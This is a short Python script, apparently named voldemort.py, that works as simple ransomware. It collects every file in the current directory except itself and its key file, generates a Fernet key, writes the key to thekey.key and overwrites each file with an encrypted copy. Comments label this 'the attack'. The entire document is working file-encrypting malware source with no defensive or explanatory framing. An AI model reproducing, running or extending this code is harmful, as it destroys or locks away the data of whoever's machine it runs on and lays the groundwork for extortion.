#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet	#library for encryption


#FILTER FOR THE ATTACK - let's find some files

files=[]

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)	
print(files)

#encrypt our files with a KEY
key= Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key) 


for file in files:
	#Extract content of the each file
	with open(file,"rb") as rfile:
		contents= rfile.read()
	#Encrypt content of the each file
	contents_encrypted= Fernet(key).encrypt(contents)
	#Write encrypted_content to original file
	with open(file,"wb") as rfile:
		rfile.write(contents_encrypted)
